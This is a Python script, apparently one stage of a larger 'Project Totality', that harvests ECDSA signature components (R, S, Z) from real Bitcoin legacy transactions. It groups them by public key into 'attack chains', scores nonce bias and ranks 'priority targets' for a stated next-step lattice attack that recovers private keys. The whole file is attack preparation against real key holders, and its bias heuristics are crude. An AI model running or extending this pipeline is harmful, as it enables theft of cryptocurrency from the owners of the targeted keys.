"""
PROJECT TOTALITY: COMPLETE PHASE 2 WORKFLOW
============================================
End-to-end pipeline for extracting real signature chains from blockchain data.

Combines:
1. CSV parsing and filtering
2. Public key extraction
3. Multi-signature grouping
4. Blockchain API fetching (with rate limiting)
5. R, S, Z component extraction
6. Bias detection
7. Attack chain preparation

Usage:
    python phase2_complete_workflow.py --input absolute_bridge_state.csv --limit 100
"""

import argparse
import json
import os
import sys
import time
from collections import defaultdict
from typing import Dict, List, Optional, Tuple

import pandas as pd
import numpy as np
from tqdm import tqdm

# Import our custom modules
try:
    from blockchain_api_fetcher import BlockchainAPIFetcher, fetch_chains_for_attack
    from enhanced_z_calculator import EnhancedBlockchainFetcher, MessageHashCalculator
except ImportError:
    print("❌ Error: Custom modules not found.")
    print("   Ensure blockchain_api_fetcher.py and enhanced_z_calculator.py are in the same directory.")
    sys.exit(1)

# Cryptographic constants
P_GATEKEEPER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N_CURVE_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
TREE_BITWIDTH = 656


class Phase2Workflow:
    """
    Complete Phase 2 workflow for signature chain extraction.
    """
    
    def __init__(self, 
                 csv_path: str,
                 output_dir: str = "phase2_output",
                 min_sigs_per_key: int = 3,
                 api_rate_limit: float = 0.5,
                 max_targets: int = None):
        """
        Initialize the workflow.
        
        Args:
            csv_path: Path to absolute_bridge_state.csv
            output_dir: Directory for output files
            min_sigs_per_key: Minimum signatures per pubkey for attack
            api_rate_limit: Seconds between API calls
            max_targets: Maximum number of targets to process (None = all)
        """
        self.csv_path = csv_path
        self.output_dir = output_dir
        self.min_sigs_per_key = min_sigs_per_key
        self.api_rate_limit = api_rate_limit
        self.max_targets = max_targets
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # Initialize data structures
        self.df_full = None
        self.df_legacy = None
        self.pubkey_groups = {}
        self.attack_chains = []
        
        # Initialize fetchers
        self.basic_fetcher = BlockchainAPIFetcher(
            rate_limit=api_rate_limit,
            cache_file=os.path.join(output_dir, "tx_cache.json")
        )
        
        self.enhanced_fetcher = EnhancedBlockchainFetcher(
            rate_limit=api_rate_limit,
            cache_file=os.path.join(output_dir, "enhanced_tx_cache.json")
        )
        
        print(f"\n🔥 [PHASE 2 WORKFLOW INITIALIZED]")
        print(f"   Input CSV: {csv_path}")
        print(f"   Output Dir: {output_dir}")
        print(f"   Min Sigs/Key: {min_sigs_per_key}")
        print(f"   API Rate Limit: {api_rate_limit}s")
        if max_targets:
            print(f"   Max Targets: {max_targets}")
    
    def load_and_filter_csv(self) -> bool:
        """
        Load CSV and filter for Legacy P2PKH transactions.
        
        Returns:
            True if successful, False otherwise
        """
        print("\n" + "="*60)
        print("📂 STEP 1: Loading and Filtering CSV")
        print("="*60)
        
        try:
            # Load CSV
            print(f"Loading {self.csv_path}...")
            self.df_full = pd.read_csv(self.csv_path, low_memory=False)
            print(f"✅ Loaded {len(self.df_full):,} total rows")
            
            # Calculate script lengths if not present
            if 'script_len' not in self.df_full.columns:
                print("Calculating script lengths...")
                self.df_full['script_len'] = self.df_full['script'].apply(
                    lambda x: len(str(x)) // 2 if pd.notnull(x) else 0
                )
            
            # Filter for Legacy P2PKH (script length = 25 bytes)
            print("Filtering for Legacy P2PKH (script_len == 25)...")
            self.df_legacy = self.df_full[self.df_full['script_len'] == 25].copy()
            print(f"✅ Found {len(self.df_legacy):,} Legacy P2PKH transactions")
            
            # Apply max_targets limit if specified
            if self.max_targets and len(self.df_legacy) > self.max_targets:
                print(f"Limiting to {self.max_targets} targets...")
                self.df_legacy = self.df_legacy.head(self.max_targets)
            
            return True
            
        except Exception as e:
            print(f"❌ Error loading CSV: {e}")
            return False
    
    def extract_public_keys(self) -> bool:
        """
        Extract public keys from scriptSigs.
        
        Returns:
            True if successful, False otherwise
        """
        print("\n" + "="*60)
        print("🔑 STEP 2: Extracting Public Keys")
        print("="*60)
        
        import re
        
        def extract_pubkey(script_hex):
            """Extract compressed public key from scriptSig."""
            if not isinstance(script_hex, str) or len(script_hex) < 66:
                return None
            
            # Find compressed pubkeys (02/03 + 64 hex chars)
            pattern = re.compile(r'(0[23][a-fA-F0-9]{64})')
            matches = pattern.findall(script_hex)
            
            return matches[-1] if matches else None
        
        try:
            print("Extracting public keys from scriptSigs...")
            self.df_legacy['pubkey'] = self.df_legacy['script'].apply(extract_pubkey)
            
            # Drop rows without valid pubkey
            df_valid = self.df_legacy.dropna(subset=['pubkey']).copy()
            print(f"✅ Extracted {len(df_valid):,} valid public keys")
            
            # Group by pubkey
            print("Grouping by public key...")
            self.pubkey_groups = {
                pk: group for pk, group in df_valid.groupby('pubkey')
            }
            
            print(f"✅ Found {len(self.pubkey_groups):,} unique public keys")
            
            # Show distribution
            sig_counts = [len(group) for group in self.pubkey_groups.values()]
            print(f"\n📊 Signature Distribution:")
            print(f"   Min: {min(sig_counts)}")
            print(f"   Max: {max(sig_counts)}")
            print(f"   Mean: {np.mean(sig_counts):.2f}")
            print(f"   Keys with ≥{self.min_sigs_per_key} sigs: {sum(1 for c in sig_counts if c >= self.min_sigs_per_key)}")
            
            return True
            
        except Exception as e:
            print(f"❌ Error extracting public keys: {e}")
            return False
    
    def check_existing_rsz_data(self) -> Tuple[List[str], List[str]]:
        """
        Check if R, S, Z data already exists in CSV.
        
        Returns:
            Tuple of (txids_with_rsz, txids_needing_fetch)
        """
        print("\n" + "="*60)
        print("🔍 STEP 3: Checking for Existing R,S,Z Data")
        print("="*60)
        
        required_cols = ['r_scalar', 's_scalar', 'z_hash']
        has_all_cols = all(col in self.df_legacy.columns for col in required_cols)
        
        if has_all_cols:
            # Check for non-null values
            df_with_rsz = self.df_legacy.dropna(subset=required_cols)
            print(f"✅ Found {len(df_with_rsz):,} rows with complete R,S,Z data")
            
            txids_with_rsz = df_with_rsz['txid'].tolist()
            all_txids = self.df_legacy['txid'].tolist()
            txids_needing_fetch = [t for t in all_txids if t not in txids_with_rsz]
            
            print(f"   Need to fetch: {len(txids_needing_fetch):,} transactions")
            
            return txids_with_rsz, txids_needing_fetch
        else:
            print("⚠️ CSV missing R,S,Z columns")
            print(f"   Available columns: {list(self.df_legacy.columns)[:10]}...")
            print(f"   All transactions need API fetching")
            
            return [], self.df_legacy['txid'].tolist()
    
    def fetch_missing_data(self, txids_to_fetch: List[str]) -> Dict:
        """
        Fetch missing transaction data from blockchain API.
        
        Args:
            txids_to_fetch: List of TXIDs to fetch
            
        Returns:
            Dict mapping txid -> {r, s, z, pubkey}
        """
        print("\n" + "="*60)
        print("📡 STEP 4: Fetching Missing Transaction Data")
        print("="*60)
        
        if not txids_to_fetch:
            print("✅ No transactions need fetching")
            return {}
        
        print(f"Fetching {len(txids_to_fetch)} transactions...")
        print(f"Estimated time: {len(txids_to_fetch) * self.api_rate_limit / 60:.1f} minutes")
        
        # Use enhanced fetcher for proper Z calculation
        fetched_data = {}
        
        for i, txid in enumerate(tqdm(txids_to_fetch, desc="Fetching TXs")):
            result = self.enhanced_fetcher.fetch_transaction_with_z(txid, verbose=False)
            
            if result:
                fetched_data[txid] = result
            
            # Progress update every 100 txs
            if (i + 1) % 100 == 0:
                print(f"  Progress: {i + 1}/{len(txids_to_fetch)} ({(i + 1) / len(txids_to_fetch) * 100:.1f}%)")
        
        # Save final cache
        self.enhanced_fetcher.save_cache()
        
        print(f"\n✅ Fetched {len(fetched_data)}/{len(txids_to_fetch)} transactions")
        success_rate = len(fetched_data) / len(txids_to_fetch) * 100 if txids_to_fetch else 0
        print(f"   Success rate: {success_rate:.1f}%")
        
        return fetched_data
    
    def build_attack_chains(self, fetched_data: Dict) -> bool:
        """
        Build attack-ready chains from extracted data.
        
        Args:
            fetched_data: Dict of fetched transaction data
            
        Returns:
            True if chains built successfully
        """
        print("\n" + "="*60)
        print("⛓️ STEP 5: Building Attack Chains")
        print("="*60)
        
        # Combine CSV data and fetched data
        all_sig_data = defaultdict(list)
        
        # Process each pubkey group
        for pubkey, group in tqdm(self.pubkey_groups.items(), desc="Building Chains"):
            for _, row in group.iterrows():
                txid = row['txid']
                
                # Try to get R, S, Z from various sources
                r_val = s_val = z_val = None
                
                # Source 1: CSV columns
                if 'r_scalar' in row and pd.notnull(row.get('r_scalar')):
                    r_val = row['r_scalar']
                if 's_scalar' in row and pd.notnull(row.get('s_scalar')):
                    s_val = row['s_scalar']
                if 'z_hash' in row and pd.notnull(row.get('z_hash')):
                    z_val = row['z_hash']
                
                # Source 2: Fetched data
                if txid in fetched_data:
                    fetched = fetched_data[txid]
                    r_val = r_val or fetched.get('r')
                    s_val = s_val or fetched.get('s')
                    z_val = z_val or fetched.get('z')
                
                # Only add if we have all three components
                if r_val and s_val and z_val:
                    all_sig_data[pubkey].append({
                        'txid': txid,
                        'r': int(r_val, 16) if isinstance(r_val, str) else r_val,
                        's': int(s_val, 16) if isinstance(s_val, str) else s_val,
                        'z': int(z_val, 16) if isinstance(z_val, str) else z_val,
                        'r_hex': format(int(r_val, 16) if isinstance(r_val, str) else r_val, '064x'),
                        's_hex': format(int(s_val, 16) if isinstance(s_val, str) else s_val, '064x'),
                        'z_hex': format(int(z_val, 16) if isinstance(z_val, str) else z_val, '064x')
                    })
        
        # Filter for keys with sufficient signatures
        self.attack_chains = []
        
        for pubkey, sigs in all_sig_data.items():
            if len(sigs) >= self.min_sigs_per_key:
                self.attack_chains.append({
                    'pubkey': pubkey,
                    'signature_count': len(sigs),
                    'signatures': sigs
                })
        
        # Sort by signature count (descending)
        self.attack_chains.sort(key=lambda x: x['signature_count'], reverse=True)
        
        print(f"\n✅ Built {len(self.attack_chains)} attack-ready chains")
        print(f"   Min sigs per chain: {self.min_sigs_per_key}")
        
        if self.attack_chains:
            print(f"\n🏆 Top 5 Attack Targets:")
            for i, chain in enumerate(self.attack_chains[:5], 1):
                print(f"   {i}. {chain['pubkey'][:20]}... ({chain['signature_count']} sigs)")
        
        return True
    
    def detect_bias(self) -> Dict:
        """
        Detect nonce bias in attack chains.
        
        Returns:
            Dict with bias analysis results
        """
        print("\n" + "="*60)
        print("⚖️ STEP 6: Nonce Bias Detection")
        print("="*60)
        
        if not self.attack_chains:
            print("⏭️ Skipping: No attack chains available")
            return {}
        
        bias_results = {}
        
        for i, chain in enumerate(tqdm(self.attack_chains, desc="Analyzing Bias")):
            pubkey = chain['pubkey']
            sigs = chain['signatures']
            
            r_values = [sig['r'] for sig in sigs]
            
            # Analysis 1: Small R values (indicating small k)
            small_r_count = sum(1 for r in r_values if r < 2**128)
            small_r_ratio = small_r_count / len(r_values) if r_values else 0
            
            # Analysis 2: Repeated upper bits
            upper_bits = [r >> 240 for r in r_values]
            unique_upper = len(set(upper_bits))
            upper_bit_repetition = 1 - (unique_upper / len(r_values)) if r_values else 0
            
            # Analysis 3: Repeated lower bits
            lower_bits = [r & 0xFFFF for r in r_values]
            unique_lower = len(set(lower_bits))
            lower_bit_repetition = 1 - (unique_lower / len(r_values)) if r_values else 0
            
            # Overall bias score (0 = no bias, 1 = high bias)
            bias_score = (small_r_ratio + upper_bit_repetition + lower_bit_repetition) / 3
            
            bias_results[pubkey] = {
                'signature_count': len(sigs),
                'small_r_ratio': small_r_ratio,
                'upper_bit_repetition': upper_bit_repetition,
                'lower_bit_repetition': lower_bit_repetition,
                'bias_score': bias_score,
                'is_biased': bias_score > 0.3  # Threshold for "biased"
            }
        
        # Summary
        biased_chains = [pk for pk, res in bias_results.items() if res['is_biased']]
        
        print(f"\n📊 Bias Analysis Summary:")
        print(f"   Total chains analyzed: {len(bias_results)}")
        print(f"   Biased chains detected: {len(biased_chains)}")
        print(f"   Bias threshold: >0.3")
        
        if biased_chains:
            print(f"\n🎯 BIASED CHAINS (Priority Targets):")
            sorted_biased = sorted(biased_chains, key=lambda pk: bias_results[pk]['bias_score'], reverse=True)
            
            for i, pk in enumerate(sorted_biased[:5], 1):
                res = bias_results[pk]
                print(f"   {i}. {pk[:20]}... (Score: {res['bias_score']:.3f}, Sigs: {res['signature_count']})")
        
        return bias_results
    
    def save_results(self, bias_results: Dict) -> List[str]:
        """
        Save all results to output files.
        
        Args:
            bias_results: Dict from detect_bias()
            
        Returns:
            List of output file paths
        """
        print("\n" + "="*60)
        print("💾 STEP 7: Saving Results")
        print("="*60)
        
        output_files = []
        
        # 1. Save attack chains (full JSON)
        chains_file = os.path.join(self.output_dir, "attack_chains_full.json")
        with open(chains_file, 'w') as f:
            json.dump(self.attack_chains, f, indent=2)
        output_files.append(chains_file)
        print(f"✅ Saved: {chains_file}")
        
        # 2. Save attack chains summary (CSV)
        summary_file = os.path.join(self.output_dir, "attack_chains_summary.csv")
        summary_data = []
        
        for chain in self.attack_chains:
            bias_res = bias_results.get(chain['pubkey'], {})
            summary_data.append({
                'pubkey': chain['pubkey'],
                'signature_count': chain['signature_count'],
                'bias_score': bias_res.get('bias_score', 0),
                'is_biased': bias_res.get('is_biased', False),
                'first_txid': chain['signatures'][0]['txid'],
                'sample_r': chain['signatures'][0]['r_hex'][:16]
            })
        
        summary_df = pd.DataFrame(summary_data)
        summary_df.to_csv(summary_file, index=False)
        output_files.append(summary_file)
        print(f"✅ Saved: {summary_file}")
        
        # 3. Save biased chains priority list
        biased_file = os.path.join(self.output_dir, "biased_chains_priority.json")
        biased_chains = [
            {'pubkey': pk, **bias_results[pk]}
            for pk in bias_results if bias_results[pk]['is_biased']
        ]
        biased_chains.sort(key=lambda x: x['bias_score'], reverse=True)
        
        with open(biased_file, 'w') as f:
            json.dump(biased_chains, f, indent=2)
        output_files.append(biased_file)
        print(f"✅ Saved: {biased_file}")
        
        # 4. Save workflow metadata
        metadata_file = os.path.join(self.output_dir, "workflow_metadata.json")
        metadata = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'input_csv': self.csv_path,
            'total_rows_loaded': len(self.df_full) if self.df_full is not None else 0,
            'legacy_p2pkh_filtered': len(self.df_legacy) if self.df_legacy is not None else 0,
            'unique_pubkeys': len(self.pubkey_groups),
            'attack_chains_built': len(self.attack_chains),
            'biased_chains_detected': len([b for b in bias_results if bias_results[b]['is_biased']]),
            'min_sigs_per_key': self.min_sigs_per_key,
            'api_rate_limit': self.api_rate_limit,
            'output_files': output_files
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        output_files.append(metadata_file)
        print(f"✅ Saved: {metadata_file}")
        
        return output_files
    
    def run(self) -> bool:
        """
        Execute complete Phase 2 workflow.
        
        Returns:
            True if workflow completed successfully
        """
        print("\n" + "🔥"*30)
        print("🚀 PROJECT TOTALITY: PHASE 2 COMPLETE WORKFLOW")
        print("🔥"*30)
        
        start_time = time.time()
        
        # Step 1: Load and filter CSV
        if not self.load_and_filter_csv():
            return False
        
        # Step 2: Extract public keys
        if not self.extract_public_keys():
            return False
        
        # Step 3: Check for existing R,S,Z data
        txids_with_rsz, txids_needing_fetch = self.check_existing_rsz_data()
        
        # Step 4: Fetch missing data
        fetched_data = {}
        if txids_needing_fetch:
            fetched_data = self.fetch_missing_data(txids_needing_fetch)
        
        # Step 5: Build attack chains
        if not self.build_attack_chains(fetched_data):
            return False
        
        # Step 6: Detect bias
        bias_results = self.detect_bias()
        
        # Step 7: Save results
        output_files = self.save_results(bias_results)
        
        # Summary
        elapsed = time.time() - start_time
        
        print("\n" + "="*60)
        print("✅ PHASE 2 WORKFLOW COMPLETE")
        print("="*60)
        print(f"   Total Time: {elapsed / 60:.1f} minutes")
        print(f"   Attack Chains: {len(self.attack_chains)}")
        print(f"   Biased Chains: {len([b for b in bias_results if bias_results[b]['is_biased']])}")
        print(f"   Output Files: {len(output_files)}")
        print(f"\n📁 Output Directory: {self.output_dir}")
        print("\n🎯 NEXT STEP: Run Phase 3 (Lattice Attack) on biased chains")
        
        return True


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description='Project Totality Phase 2: Signature Chain Extraction'
    )
    
    parser.add_argument(
        '--input', '-i',
        required=True,
        help='Path to absolute_bridge_state.csv'
    )
    
    parser.add_argument(
        '--output-dir', '-o',
        default='phase2_output',
        help='Output directory (default: phase2_output)'
    )
    
    parser.add_argument(
        '--min-sigs', '-m',
        type=int,
        default=3,
        help='Minimum signatures per key for attack (default: 3)'
    )
    
    parser.add_argument(
        '--rate-limit', '-r',
        type=float,
        default=0.5,
        help='API rate limit in seconds (default: 0.5)'
    )
    
    parser.add_argument(
        '--limit', '-l',
        type=int,
        default=None,
        help='Maximum number of targets to process (default: all)'
    )
    
    args = parser.parse_args()
    
    # Run workflow
    workflow = Phase2Workflow(
        csv_path=args.input,
        output_dir=args.output_dir,
        min_sigs_per_key=args.min_sigs,
        api_rate_limit=args.rate_limit,
        max_targets=args.limit
    )
    
    success = workflow.run()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
